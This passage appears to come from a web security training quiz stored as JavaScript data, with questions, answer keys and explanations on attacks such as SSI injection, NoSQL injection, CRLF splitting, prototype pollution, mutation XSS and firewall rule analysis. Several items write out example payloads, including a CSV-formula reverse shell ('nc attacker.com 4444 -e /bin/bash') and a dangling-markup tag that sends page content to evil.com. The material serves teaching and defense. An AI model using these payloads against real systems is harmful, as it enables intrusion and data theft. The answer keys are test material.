            explanation: '🚨 CSP Bypass via JSONP: trusted.com has endpoint /jsonp?callback=ATTACKER_FUNCTION. Attacker injects: script tag with trusted.com JSONP endpoint. CSP allows (whitelisted domain), JSONP executes callback = arbitrary JS. Other bypasses: Whitelisted CDNs (if attacker uploads files), Angular libraries (CSP gadgets), dangling markup. Defense: **Remove JSONP** (use CORS instead), use CSP nonces/hashes (not whitelist), strict-dynamic directive, minimize whitelist. Check CSP: Mozilla Observatory, CSP Evaluator. Modern: CSP Level 3 with nonce-based policies. CWE-1021.'
        },
        {
            id: 'web27',
            title: 'Server-Side Includes Injection',
            points: 7,
            question: 'Input reflects in page: <code>&lt;!--#exec cmd="id"--&gt;</code>. Server processes SSI directives. What is vulnerability?',
            type: 'radio',
            options: [
                { value: 'ssi_injection', text: 'SSI Injection' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'ssti', text: 'Server-Side Template Injection' },
                { value: 'comment_injection', text: 'HTML comment injection' },
                { value: 'sqli', text: 'SQL injection' }
            ],
            correct: 'ssi_injection',
            explanation: '⚙️ SSI Injection: Server-Side Includes = directives processed by web server (Apache, IIS). <!--#exec cmd="whoami"--> executes shell command. Other directives: <!--#include file="/etc/passwd"-->, <!--#echo var="DOCUMENT_ROOT"-->. Files: .shtml, .stm, or if SSI enabled for .html. Impact: RCE, file disclosure, environment variable leakage. Defense: **Disable SSI** (Apache: Options -Includes), input validation (reject <!--#), HTML encode output. Rare in modern apps (legacy feature). Test: Look for .shtml, inject SSI directives. Similar to SSTI but older technology. CWE-97.'
        },
        {
            id: 'web28',
            title: 'Parameter Pollution',
            points: 7,
            question: 'Request: <code>?userid=123&userid=456</code>. Backend uses first value, WAF checks last. What attack is this enabling?',
            type: 'radio',
            options: [
                { value: 'hpp', text: 'HTTP Parameter Pollution' },
                { value: 'idor', text: 'Standard IDOR attack' },
                { value: 'dos', text: 'Denial of Service' },
                { value: 'csrf', text: 'Cross-Site Request Forgery' },
                { value: 'normal', text: 'Normal behavior' }
            ],
            correct: 'hpp',
            explanation: '🔀 HTTP Parameter Pollution: Multiple parameters with same name parsed differently. Example: userid=123&userid=456. **Parsing**: PHP = last value (456), ASP = both comma-separated (123,456), JSP = first (123). Attack: WAF checks userid=456 (legit), backend uses userid=123 (malicious) → WAF bypass. Also: SQLi bypass, authorization bypass, cache poisoning. Defense: Reject duplicate parameters, parse consistently, WAF should check ALL values. RFC 3986 doesn\'t specify behavior (implementation-dependent). Test: Fuzz with duplicate params. Tools: Burp Suite parameter fuzzing. CWE-235.'
        },
        {
            id: 'web29',
            title: 'NoSQL Injection',
            points: 8,
            question: 'MongoDB query: <code>db.users.find({username: req.body.username, password: req.body.password})</code>. Attacker sends: <code>{"username": {"$ne": null}, "password": {"$ne": null}}</code>. What happens?',
            type: 'radio',
            options: [
                { value: 'nosql_injection', text: 'NoSQL Injection' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'xss', text: 'XSS attack' },
                { value: 'blocked', text: 'Query fails' },
                { value: 'safe', text: 'Safe' }
            ],
            correct: 'nosql_injection',
            explanation: '🍃 NoSQL Injection (MongoDB): Operator injection bypasses auth. {"$ne": null} = "not equal to null" (always true for existing users). Query becomes: Find user where username ≠ null AND password ≠ null = returns first user (often admin). Other operators: $gt (greater than), $regex (regex match), $where (JavaScript injection). Also affects: CouchDB, Redis, Cassandra. Defense: **Input validation** (reject objects, allow only strings), **sanitization** (mongo-sanitize npm), parameterized queries, principle of least privilege. Never trust user input as query operators. CWE-943. Tool: NoSQLMap.'
        },
        {
            id: 'web30',
            title: 'Cache Deception',
            points: 7,
            question: 'Attacker tricks victim to visit <code>https://bank.com/account/info.css</code>. CDN caches response. Attacker accesses cached private data. What attack?',
            type: 'radio',
            options: [
                { value: 'cache_deception', text: 'Web Cache Deception' },
                { value: 'cache_poisoning', text: 'Cache poisoning' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'idor', text: 'IDOR attack' },
                { value: 'csrf', text: 'CSRF attack' }
            ],
            correct: 'cache_deception',
            explanation: '💾 Web Cache Deception: CDN caches based on file extension (.css, .js = cacheable). App ignores path (bank.com/account/info.css = bank.com/account/info). Victim visits malicious link → CDN caches sensitive response → attacker retrieves from cache. vs Cache Poisoning (modify cached content). Discovered 2017 (PayPal, CloudFlare vulnerable). Defense: **Strict cache rules** (only cache truly static content), normalize URLs before routing, validate content-type matches extension, private Cache-Control headers. Test: Try appending .css to authenticated pages. CWE-524.'
        },
        {
            id: 'web31',
            title: 'Path Traversal Variations',
            points: 6,
            question: 'Application blocks "../" in file parameter. Which bypass techniques might work? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'encoding', text: 'URL encoding: %2e%2e%2f' },
                { value: 'double_encode', text: 'Double encoding: %252e%252e%252f' },
                { value: 'unicode', text: 'Unicode: ..%c0%af' },
                { value: 'absolute', text: 'Absolute path: /etc/passwd' },
                { value: 'dot_only', text: 'Using single dots: ./file' },
                { value: 'no_bypass', text: 'No bypass possible' }
            ],
            correct: ['encoding', 'double_encode', 'unicode', 'absolute'],
            explanation: '🔄 Path Traversal Bypasses: Naive filtering fails. Techniques: 1) **URL encode** (../ → %2e%2e%2f), 2) **Double encode** (%2e → %252e), 3) **Unicode** (..%c0%af = UTF-8 overlong encoding), 4) **Absolute paths** (/etc/passwd), 5) **16-bit Unicode** (..%u2216), 6) **Backslash** (Windows: ..\\ instead of ../), 7) **Nested** (....//), 8) **Null byte** (file.txt%00.jpg). Defense: **Whitelist** allowed files, canonical path comparison (realpath), chroot jail, reject all path manipulation chars. Never blacklist (incomplete). Tools: Dotdotpwn, Burp Intruder. CWE-22.'
        },
        {
            id: 'web32',
            title: 'Open Redirect Exploitation',
            points: 6,
            question: 'Login page redirects after auth: <code>/login?next=https://evil.com</code>. What is security impact?',
            type: 'checkbox',
            options: [
                { value: 'phishing', text: 'Phishing' },
                { value: 'oauth', text: 'OAuth token theft' },
                { value: 'seo', text: 'SEO manipulation / link farming' },
                { value: 'ssrf', text: 'Server-Side Request Forgery escalation' },
                { value: 'no_risk', text: 'No risk' },
                { value: 'xss', text: 'Direct XSS exploitation' }
            ],
            correct: ['phishing', 'oauth', 'seo', 'ssrf'],
            explanation: '↪️ Open Redirect: Unvalidated redirect. Impacts: 1) **Phishing** (email: "Click bank.com/login?next=evil.com" looks legit, redirects after login), 2) **OAuth** (redirect to attacker → steal tokens), 3) **SSRF** (redirect to internal IPs), 4) **SEO** (link farming). Not direct XSS (unless javascript: URI). Defense: **Whitelist** allowed domains, use relative URLs only (/dashboard not https://...), validate URL scheme (only http/https). Real incidents: Google, Facebook open redirects used in phishing. CWE-601. OWASP: Unvalidated Redirects and Forwards.'
        },
        {
            id: 'web33',
            title: 'Cookie Attributes Security',
            points: 7,
            question: 'Which cookie attributes improve security? (Select ALL that apply)',
            type: 'checkbox',
            options: [
                { value: 'httponly', text: 'HttpOnly' },
                { value: 'secure', text: 'Secure' },
                { value: 'samesite', text: 'SameSite=Strict' },
                { value: 'domain', text: 'Domain=.example.com' },
                { value: 'expires', text: 'Expires in far future' },
                { value: 'path', text: 'Path=/' }
            ],
            correct: ['httponly', 'secure', 'samesite'],
            explanation: '🍪 Secure Cookie Attributes: **HttpOnly** = JavaScript can\'t read (document.cookie blocked) → XSS can\'t steal session. **Secure** = only HTTPS transmission → MITM can\'t intercept. **SameSite** = Strict (no cross-site cookies, blocks CSRF), Lax (allows GET navigation), None (requires Secure). **Bad practices**: Domain=.example.com (subdomain XSS = steal cookies), long expiration (persistent = can\'t force logout), Path=/ (broader scope). Best: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/app. Also: __Host- prefix (strict domain/path). OWASP Session Management Cheat Sheet.'
        },
        {
            id: 'web34',
            title: 'Subdomain Takeover',
            points: 7,
            question: 'DNS: <code>blog.example.com CNAME old-site.herokuapp.com</code>. Heroku account deleted. Attacker registers old-site. What vulnerability?',
            type: 'radio',
            options: [
                { value: 'subdomain_takeover', text: 'Subdomain Takeover' },
                { value: 'dns_hijack', text: 'DNS hijacking' },
                { value: 'domain_squat', text: 'Domain squatting' },
                { value: 'dns_poison', text: 'DNS cache poisoning' },
                { value: 'normal', text: 'Normal DNS configuration' }
            ],
            correct: 'subdomain_takeover',
            explanation: '🏴 Subdomain Takeover: Dangling DNS. CNAME → unclaimed resource → attacker claims → controls subdomain. Targets: GitHub Pages, Heroku, AWS S3, Azure, Fastly, Shopify. Impact: Phishing (trusted subdomain), steal cookies (same-origin), OAuth bypass, SSL certificate issuance. Discovery: DNS query returns NXDOMAIN but CNAME exists. Defense: **Monitor DNS** (remove old records), claim resources before deletion, automated scanning (SubOver, Subjack). Bug bounty favorite (high severity). Examples: Uber, Shopify, Microsoft subdomains taken over. CWE-350.'
        },
        {
            id: 'web35',
            title: 'API Versioning Bypass',
            points: 6,
            question: 'API v2 enforces authentication. Attacker accesses /api/v1/users (old version, no auth). What is the issue?',
            type: 'radio',
            options: [
                { value: 'version_bypass', text: 'API version bypass' },
                { value: 'idor', text: 'IDOR vulnerability' },
                { value: 'dos', text: 'Denial of Service' },
                { value: 'normal', text: 'Normal behavior' },
                { value: 'csrf', text: 'CSRF attack' }
            ],
            correct: 'version_bypass',
            explanation: '🔢 API Version Security: Old API versions often forgotten, lack modern security. /api/v1/ = no auth/rate limiting, /api/v2/ = secured. Attacker uses v1 to bypass. Also: Deprecated endpoints, beta APIs, internal APIs accidentally exposed. Defense: **Decommission old versions** (sunset policy), apply security uniformly across versions, redirect v1→v2, API gateway enforces policies. Document version support lifecycle. Test: Enumerate versions (/api/v0, /v1, /v2, /internal), check GraphQL introspection. OWASP API Security Top 10 #9. Real bugs: Twitter, Facebook API version bypasses.'
        },
        {
            id: 'web36',
            title: 'Request Smuggling Detection',
            points: 8,
            question: 'Responses to identical requests differ when sent through load balancer vs directly. What might this indicate?',
            type: 'radio',
            options: [
                { value: 'smuggling', text: 'Request smuggling' },
                { value: 'load_balancing', text: 'Normal load balancing behavior' },
                { value: 'caching', text: 'Caching differences only' },
                { value: 'network', text: 'Network latency variations' },
                { value: 'geo', text: 'Geo-location routing' }
            ],
            correct: 'smuggling',
            explanation: '🔀 Request Smuggling Detection: Symptom = inconsistent responses. LB sees 1 request, backend sees 2 (or vice versa). Test: Send ambiguous Content-Length + Transfer-Encoding. CL.TE: Front-end uses CL (ends early), back-end uses TE (reads more) = next request prefixed with attacker data. Impact: Bypass security, poison cache, hijack requests. Detection: Timing delays, response queue poisoning. Defense: Normalize at edge, reject ambiguous requests, HTTP/2 (binary framing). Tools: Burp Suite Smuggler extension, smuggler.py. PortSwigger Research (James Kettle). Critical severity.'
        },
        {
            id: 'web37',
            title: 'Mass Assignment',
            points: 7,
            question: 'User update POST: <code>{"username":"alice","email":"a@a.com","isAdmin":true}</code>. App binds all fields. What vulnerability?',
            type: 'radio',
            options: [
                { value: 'mass_assignment', text: 'Mass Assignment' },
                { value: 'idor', text: 'IDOR attack' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'xss', text: 'XSS attack' },
                { value: 'normal', text: 'Normal API behavior' }
            ],
            correct: 'mass_assignment',
            explanation: '📝 Mass Assignment: Framework auto-binds request params to object properties. User.update(req.body) binds ALL fields including isAdmin, role, salary. Attack: Add unauthorized fields → privilege escalation. Affected: Ruby on Rails (strong parameters), Node.js (Mongoose), Laravel, ASP.NET. Defense: **Whitelist** allowed fields (Rails: permit(:username, :email)), never use req.body directly, use DTOs (Data Transfer Objects), read-only properties. GitHub mass assignment vulnerability (2012) = arbitrary repo access. CWE-915. OWASP: Insecure Design.'
        },
        {
            id: 'web38',
            title: 'HTTP Response Splitting',
            points: 7,
            question: 'Header: <code>Location: /page?url=VALUE%0d%0aSet-Cookie:admin=true</code>. What attack is possible?',
            type: 'radio',
            options: [
                { value: 'response_split', text: 'HTTP Response Splitting' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'open_redirect', text: 'Open redirect only' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'no_risk', text: 'No vulnerability' }
            ],
            correct: 'response_split',
            explanation: '📤 HTTP Response Splitting: %0d%0a = CRLF (\\r\\n) injects new headers. Example: Location: /page?url=x%0d%0aSet-Cookie:admin=true → splits response, injects cookie. Two attacks: 1) **Header injection** (add Set-Cookie, modify headers), 2) **Response splitting** (inject full response body for XSS). Impact: Session fixation, cache poisoning, XSS. Defense: **Validate headers** (reject CRLF), encode user input, use framework built-ins (don\'t construct headers manually). Modern frameworks prevent (auto-encode). Historic vulnerability (2004-2008). CWE-113. Check: Burp Collaborator for CRLF injection.'
        },
        {
            id: 'web39',
            title: 'Prototype Pollution',
            points: 8,
            question: 'Node.js app: <code>merge(userObject, req.body)</code>. Attacker sends: <code>{"__proto__":{"isAdmin":true}}</code>. What happens?',
            type: 'radio',
            options: [
                { value: 'prototype_pollution', text: 'Prototype Pollution' },
                { value: 'mass_assignment', text: 'Mass assignment only' },
                { value: 'xss', text: 'XSS injection' },
                { value: 'safe', text: 'Safe' },
                { value: 'dos', text: 'Denial of Service' }
            ],
            correct: 'prototype_pollution',
            explanation: '⚠️ Prototype Pollution: JavaScript inheritance pollution. __proto__ modifies Object.prototype → ALL objects inherit. Attack: Inject __proto__.isAdmin=true → every object now has isAdmin=true → privilege escalation. Also: constructor.prototype, RCE via polluting template engine properties. Affected: Lodash merge, jQuery extend, Hoek merge. Defense: **Object.freeze(Object.prototype)**, use Map instead of objects, validate keys (reject __proto__), JSON schema validation. Tools: ppmap, prototype-pollution-scanner. CVE-2019-10744 (Lodash). Modern libs patched. CWE-1321.'
        },
        {
            id: 'web40',
            title: 'Email Header Injection',
            points: 7,
            question: 'Contact form sends email. User input in To field: <code>victim@test.com%0aBcc:spam@list.com</code>. What attack?',
            type: 'radio',
            options: [
                { value: 'email_injection', text: 'Email Header Injection' },
                { value: 'xss', text: 'XSS attack' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'phishing', text: 'Simple phishing attempt' },
                { value: 'normal', text: 'Normal email format' }
            ],
            correct: 'email_injection',
            explanation: '📧 Email Header Injection: CRLF (%0a = \\n) injects headers in SMTP. Inject Bcc/Cc → spam via legit server, inject body (\\n\\n) → phishing email from trusted domain. Example: To: x%0aBcc:spam1@list.com%0aBcc:spam2@list.com. Impact: Email spam relay, phishing, reputation damage (SPF/DKIM valid = not caught by filters). Defense: **Validate email addresses** (RFC 5322, reject CRLF), use mail library functions (do not construct SMTP manually), sanitize input. Similar to HTTP Response Splitting. CWE-93. Test: Inject \\r\\n in email forms.'
        },
        {
            id: 'web41',
            title: 'Relative Path Overwrite',
            points: 7,
            question: 'Page loads CSS: <code>&lt;link href="style.css"&gt;</code>. URL: <code>/page/..;/evil.css</code>. Browser loads evil.css as stylesheet. What attack?',
            type: 'radio',
            options: [
                { value: 'rpo', text: 'Relative Path Overwrite' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'path_traversal', text: 'Path traversal' },
                { value: 'css_injection', text: 'CSS injection only' },
                { value: 'normal', text: 'Normal browser behavior' }
            ],
            correct: 'rpo',
            explanation: '🔀 Relative Path Overwrite: Trick browser into resolving relative URLs differently. Server: /page/..;/evil.css → /page/, Browser resolves style.css relative to /page/..;/ = /evil.css. Requires: Apache path normalization quirks, relative URLs, reflected content. Impact: Execute attacker CSS (CSS injection → data exfiltration), load attacker JS if MIME type wrong. Mitigated by: Absolute URLs (/static/style.css), proper Content-Type headers, Content-Security-Policy. Rare but browser-dependent. Research: Gareth Heyes 2014. CWE-23 variant.'
        },
        {
            id: 'web42',
            title: 'CSV Injection',
            points: 6,
            question: 'User exports data to CSV. Cell contains: <code>=cmd|/c calc</code>. Excel opens CSV and executes calc. What vulnerability?',
            type: 'radio',
            options: [
                { value: 'csv_injection', text: 'CSV Injection / Formula Injection' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'command_injection', text: 'OS command injection' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'normal', text: 'Normal CSV feature' }
            ],
            correct: 'csv_injection',
            explanation: '📊 CSV/Formula Injection: Excel/LibreOffice execute formulas in CSV. =cmd|/c calc (Windows), =cmd|/c nc attacker.com 4444 -e /bin/bash. Prefixes: =, +, -, @. Also: DDE attacks =cmd|/c powershell. Impact: RCE when victim opens CSV, data exfiltration (=WEBSERVICE). Defense: **Prefix with apostrophe** (\'=1+1 = literal string), use TSV instead, warn users "Contains formulas", Content-Type: text/plain. Affects: CRM exports, log exports, report generation. OWASP: CSV Injection. Not widely recognized (user interaction required).'
        },
        {
            id: 'web43',
            title: 'Tabnabbing',
            points: 6,
            question: 'Link: <code>&lt;a href="https://evil.com" target="_blank"&gt;</code>. Evil.com runs: <code>window.opener.location="https://phishing.com"</code>. What attack?',
            type: 'radio',
            options: [
                { value: 'tabnabbing', text: 'Reverse Tabnabbing' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'clickjacking', text: 'Clickjacking' },
                { value: 'csrf', text: 'CSRF attack' },
                { value: 'normal', text: 'Normal browser behavior' }
            ],
            correct: 'tabnabbing',
            explanation: '🪟 Reverse Tabnabbing: target="_blank" without rel="noopener" = child window gets window.opener reference → child changes parent URL to phishing. User in new tab, doesn\'t notice parent tab changed to fake login. Defense: **rel="noopener noreferrer"** (breaks window.opener), modern browsers default to noopener. Impact: Phishing (trusted site suddenly asks re-login). Discovery: Jitbit 2010. Also affects: window.open(). Check: Links to external sites, especially user-generated content. CWE-1021. Always use rel="noopener" for target="_blank".'
        },
        {
            id: 'web44',
            title: 'MIME Sniffing XSS',
            points: 7,
            question: 'Image upload allows .jpg. Attacker uploads HTML with <code>&lt;script&gt;</code>, filename: payload.jpg. Browser executes JavaScript. Why?',
            type: 'radio',
            options: [
                { value: 'mime_sniff', text: 'MIME sniffing' },
                { value: 'file_upload', text: 'File upload vulnerability only' },
                { value: 'xss', text: 'Stored XSS' },
                { value: 'polyglot', text: 'Polyglot file' },
                { value: 'impossible', text: 'Impossible to execute' }
            ],
            correct: 'mime_sniff',
            explanation: '🔍 MIME Sniffing XSS: Old browsers (IE, Chrome <70) ignore Content-Type: image/jpeg, detect HTML content (sees <html>), execute as HTML = XSS. File contains HTML/JS but has .jpg name and JPEG Content-Type. Defense: **X-Content-Type-Options: nosniff** (force browser to trust Content-Type), validate file content (magic bytes), serve uploads from different domain (S3, CDN), Content-Disposition: attachment. Modern browsers safer but still risk. CWE-79 variant. Test: Upload HTML disguised as image.'
        },
        {
            id: 'web45',
            title: 'Unicode Normalization Bypass',
            points: 7,
            question: 'Filter blocks "script". Attacker uses: <code>&lt;ſcript&gt;</code> (Unicode long s: U+017F). Normalized to "script" server-side. What attack?',
            type: 'radio',
            options: [
                { value: 'unicode_bypass', text: 'Unicode normalization bypass' },
                { value: 'xss', text: 'Regular XSS' },
                { value: 'encoding', text: 'Simple encoding bypass' },
                { value: 'blocked', text: 'Filter successfully blocks it' },
                { value: 'utf8', text: 'UTF-8 vulnerability' }
            ],
            correct: 'unicode_bypass',
            explanation: '🔤 Unicode Normalization: Filter checks before normalization, app normalizes after → bypass. Example: ſ (U+017F) normalizes to s. <ſcript> passes filter, executes as <script>. Other: Cyrillic a (U+0430) looks like Latin a, ZERO WIDTH chars, combining diacritics. Also: Homograph attacks (domains), SQLi bypass. Defense: **Normalize early** (validate after normalization), use Unicode aware regex (\\p{...}), whitelist approach. NFC, NFD, NFKC, NFKD forms. Unicode security TR#36. Tools: Unicode confusables. CWE-176.'
        },
        {
            id: 'web46',
            title: 'DOM Clobbering',
            points: 7,
            question: 'HTML: <code>&lt;form id="test"&gt;</code>. JavaScript: <code>if(window.test.value) {redirect()}</code>. What vulnerability?',
            type: 'radio',
            options: [
                { value: 'dom_clobber', text: 'DOM Clobbering' },
                { value: 'xss', text: 'Cross-Site Scripting' },
                { value: 'prototype_pollution', text: 'Prototype Pollution' },
                { value: 'logic', text: 'Business logic flaw' },
                { value: 'normal', text: 'Normal HTML/JS behavior' }
            ],
            correct: 'dom_clobber',
            explanation: '🌐 DOM Clobbering: HTML elements with id/name create global variables. <form id="test"> creates window.test = HTMLFormElement. Code expecting window.test as config object gets HTML element instead → logic bypass. Attack: Inject <input name="isAdmin" value="true"> → clobber window.isAdmin. No JavaScript needed (HTML-only XSS variant). Defense: Use strict comparison (===), namespace variables (app.test not window.test), validate types (instanceof). Rare but effective when XSS filtered. PortSwigger research. CWE-79 variant.'
        },
        {
            id: 'web47',
            title: 'Dangling Markup Injection',
            points: 7,
            question: 'Input: <code>&lt;img src="//evil.com?</code> (no closing). Browser sends rest of HTML as query string. What is exfiltrated?',
            type: 'checkbox',
            options: [
                { value: 'csrf_token', text: 'CSRF tokens in subsequent HTML' },
                { value: 'sensitive_data', text: 'Sensitive data in HTML' },
                { value: 'cookies', text: 'Session cookies' },
                { value: 'post_data', text: 'POST form data' },
                { value: 'nothing', text: 'Nothing' }
            ],
            correct: ['csrf_token', 'sensitive_data'],
            explanation: '🔖 Dangling Markup: Incomplete HTML tag = browser includes rest of HTML in URL. <img src="//evil.com? → browser treats until next " as URL → sends HTML to evil.com. Exfiltrates: CSRF tokens, API keys, email addresses (anything in HTML before next "). NOT cookies (HttpOnly) or POST data (not in HTML). Mitigated by: CSP (img-src), X-Content-Type-Options, angle bracket encoding. Useful when XSS blocked but injection possible. Requires user interaction (trigger page load). Modern CSP prevents. CWE-79 variant.'
        },
        {
            id: 'web48',
            title: 'Mutation XSS',
            points: 8,
            question: 'HTML sanitizer allows: <code>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;</code>. Browser re-parses and executes. What attack?',
            type: 'radio',
            options: [
                { value: 'mxss', text: 'Mutation XSS' },
                { value: 'dom_xss', text: 'DOM-based XSS' },
                { value: 'reflected_xss', text: 'Reflected XSS' },
                { value: 'blocked', text: 'Sanitizer blocks this payload' },
                { value: 'normal_xss', text: 'Regular stored XSS' }
            ],
            correct: 'mxss',
            explanation: '🧬 Mutation XSS: Sanitizer parses HTML differently than browser. Sanitizer: <noscript> is safe. Browser: If JS enabled, <noscript> content ignored, re-parses, <img> escapes attribute. Mutation occurs during innerHTML assignment, browser context switches. Also: SVG/MathML mutations, namespace confusion, <style> mutations. Defense: **DOMPurify** (mutation-aware), parse with same library as browser, CSP, avoid innerHTML. Discovery: Mario Heiderich 2013. Browser-specific. CWE-79 variant. Very complex to exploit.'
        },
        {
            id: 'web49',
            title: 'CORS Preflight Bypass',
            points: 7,
            question: 'API checks CORS on OPTIONS preflight but not on actual POST. Attacker sends POST without preflight. What happens?',
            type: 'radio',
            options: [
                { value: 'simple_request', text: 'Request succeeds (simple request doesn\'t require preflight)' },
                { value: 'blocked', text: 'Browser blocks' },
                { value: 'cors_bypass', text: 'CORS completely bypassed' },
                { value: 'preflight_required', text: 'Preflight always required for POST' },
                { value: 'error', text: 'Server error' }
            ],
            correct: 'simple_request',
            explanation: '✈️ CORS Simple Requests: No preflight for: GET/HEAD/POST with Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data + standard headers. POST with JSON requires preflight (OPTIONS). Attack: Use simple POST (form-encoded) → bypass CORS check → CSRF-like attack. Server must check Origin on actual request, not just OPTIONS. Defense: **Validate Origin header on every request**, use custom headers (forces preflight), JSON API (forces preflight). CORS != CSRF protection. CWE-942.'
        },
        {
            id: 'web50',
            title: 'Type Juggling',
            points: 7,
            question: 'PHP code: <code>if($password == "0e123") {...}</code>. Attacker sends: <code>"0e456"</code>. Login succeeds. Why?',
            type: 'radio',
            options: [
                { value: 'type_juggling', text: 'Type juggling' },
                { value: 'sqli', text: 'SQL injection' },
                { value: 'hash_collision', text: 'Password hash collision' },
                { value: 'logic_error', text: 'Simple logic error' },
                { value: 'correct_password', text: 'Attacker knows correct password' }
            ],
            correct: 'type_juggling',
            explanation: '🔢 PHP Type Juggling: Loose comparison (==) converts types. "0e123" == "0e456" → both parsed as 0×10^123 and 0×10^456 (scientific notation) → 0 == 0 = true. Also: "0" == false, "0x01" == 1 (hex), true == 1. Authentication bypass: MD5 hash starts with 0e → compared as 0. Defense: **Strict comparison** (===), type checking (is_string), hash_equals() for hashes. PHP-specific but concept applies (JavaScript, Python weak equality). Magic hashes: 0e215962017, 0e462097431906509019562988736854. CWE-1024.'
        }
    ],
    firewall: [
        {
            id: 'fw1',
            title: 'Rule Analysis',
            points: 15,
            question: 'Review these firewall rules (processed top-to-bottom):<br><table><tr><th>#</th><th>Source</th><th>Destination</th><th>Port</th><th>Action</th></tr><tr><td>1</td><td>10.10.0.0/16</td><td>Any</td><td>Any</td><td>ALLOW</td></tr><tr><td>2</td><td>Any</td><td>192.168.100.50</td><td>80,443</td><td>ALLOW</td></tr><tr><td>3</td><td>Any</td><td>192.168.100.50</td><td>22</td><td>DENY</td></tr><tr><td>4</td><td>Any</td><td>Any</td><td>Any</td><td>DENY</td></tr></table><br>What security issues exist? (Select ALL that apply)',
            type: 'checkbox',
            options: [
                { value: 'rule1_broad', text: 'Rule 1 is too permissive' },
                { value: 'rule3_useless', text: 'Rule 3 is ineffective' },
                { value: 'no_logging', text: 'No logging rules specified' },
                { value: 'ssh_exposed', text: 'SSH is completely exposed' }
            ],
            correct: ['rule1_broad', 'rule3_useless', 'ssh_exposed'],
            explanation: '🔥 Three critical issues: 1) Rule 1 allows 65,536 IPs (10.10.0.0/16) to ANYWHERE - violate least privilege. 2) Rule 3 is SHADOWED - never executes because Rule 1 already permitted 10.10.x.x to port 22. 3) SSH exposed to massive subnet. Fix: Move specific rules BEFORE broad rules, tighten Rule 1 to specific destinations. Rule shadowing = #1 firewall misconfiguration. Order matters in ACLs!'
        },
        {
            id: 'fw2',
            title: 'Rule Creation',
            points: 10,
            question: 'You need to allow ONLY the IT management subnet 172.20.10.0/24 to SSH (port 22) into server 192.168.1.100. Select the CORRECT rule:',
            type: 'radio',
            options: [
                { value: 'correct', text: 'ALLOW | Source: 172.20.10.0/24 | Destination: 192.168.1.100 | Port: 22 | Protocol: TCP' },
                { value: 'anyport', text: 'ALLOW | Source: 172.20.10.0/24 | Destination: 192.168.1.100 | Port: ANY | Protocol: TCP' },
                { value: 'anysource', text: 'ALLOW | Source: ANY | Destination: 192.168.1.100 | Port: 22 | Protocol: TCP' },
                { value: 'wrongsubnet', text: 'ALLOW | Source: 172.20.0.0/16 | Destination: 192.168.1.100 | Port: 22 | Protocol: TCP' },
                { value: 'udp', text: 'ALLOW | Source: 172.20.10.0/24 | Destination: 192.168.1.100 | Port: 22 | Protocol: UDP' },
                { value: 'deny', text: 'DENY | Source: 172.20.10.0/24 | Destination: 192.168.1.100 | Port: 22 | Protocol: TCP' }
            ],
            correct: 'correct',
            explanation: '✅ Correct rule uses: specific source subnet (/24 not /16), specific destination IP, port 22 ONLY, TCP protocol (SSH uses TCP not UDP), ALLOW action. Common mistakes: /16 too broad (256 subnets!), ANY source defeats purpose, UDP wrong (SSH = TCP), DENY blocks instead of allows. Remember: Firewall rules = most specific wins.'
        },
        {
            id: 'fw3',
            title: 'Implicit Deny Concept',
            points: 6,
            question: 'Firewall has rules 1-10 but no final "DENY ALL" rule. What happens to traffic not matching any rule?',
            type: 'radio',
            options: [
                { value: 'implicit_deny', text: 'Dropped by implicit deny' },
                { value: 'allowed', text: 'Allowed through' },
                { value: 'logged', text: 'Logged but passed through' },
                { value: 'random', text: 'Random allow/deny behavior' },
                { value: 'error', text: 'Causes firewall error' }
            ],
            correct: 'implicit_deny',
            explanation: '🛡️ Implicit Deny: Best practice firewall design = default DENY all, explicitly ALLOW needed traffic. Most enterprise firewalls (Cisco ASA, Palo Alto, pfSense) have implicit deny as last rule. Explicit "DENY ANY ANY" is redundant but aids documentation. Exception: Some cloud security groups default to allow. Always verify your firewall\'s default behavior. Zero Trust principle.'
        },
        {
            id: 'fw4',
            title: 'Stateful vs Stateless',
            points: 8,
            question: 'Stateful firewall allows outbound HTTPS (443/TCP). Client initiates connection to web server. Does return traffic need explicit rule?',
            type: 'radio',
            options: [
                { value: 'stateful_no', text: 'No' },
                { value: 'stateless_yes', text: 'Yes' },
                { value: 'depends', text: 'Depends on TCP flags only' },
                { value: 'timeout', text: 'Only if connection completes within 30 seconds' },
                { value: 'port', text: 'Yes' }
            ],
            correct: 'stateful_no',
            explanation: '🔄 Stateful Inspection: Firewall maintains connection table tracking state (SYN, SYN-ACK, ESTABLISHED). Outbound rule 443/TCP automatically allows return packets from server:443 to client:random_high_port. Stateless (ACLs) require bidirectional rules. Modern NGFWs are stateful. Connection table tracks: src_ip, dst_ip, src_port, dst_port, protocol, state. Tools: "show conn" (ASA), "conntrack -L" (Linux).'
        },
        {
            id: 'fw5',
            title: 'NAT and Firewall Rules',
            points: 9,
            question: 'Internal server 10.1.1.50 is NAT\'d to public IP 203.0.113.10. Firewall rule should use which IP for destination?',
            type: 'radio',
            options: [
                { value: 'depends_placement', text: 'Depends on rule placement' },
                { value: 'always_private', text: 'Always use 10.1.1.50' },
                { value: 'always_public', text: 'Always use 203.0.113.10' },
                { value: 'both', text: 'Create rules for both IPs' },
                { value: 'hostname', text: 'Use DNS hostname instead' }
            ],
            correct: 'depends_placement',
            explanation: '🔀 NAT Order Matters: Traffic flow = Outside → Firewall rules (uses public IP) → NAT translation → Internal rules (uses private IP). Cisco ASA: Outside rule uses 203.0.113.10, inside rule uses 10.1.1.50. Palo Alto: Pre-NAT (public) vs Post-NAT (private) rule zones. AWS Security Groups: Always use private IP (NAT happens at IGW). Check vendor docs for NAT/ACL order. Wrong IP = rule never matches.'
        },
        {
            id: 'fw6',
            title: 'ICMP Filtering',
            points: 7,
            question: 'Security team wants to block ping (ICMP echo) but allow "destination unreachable" messages. Select correct approach:',
            type: 'radio',
            options: [
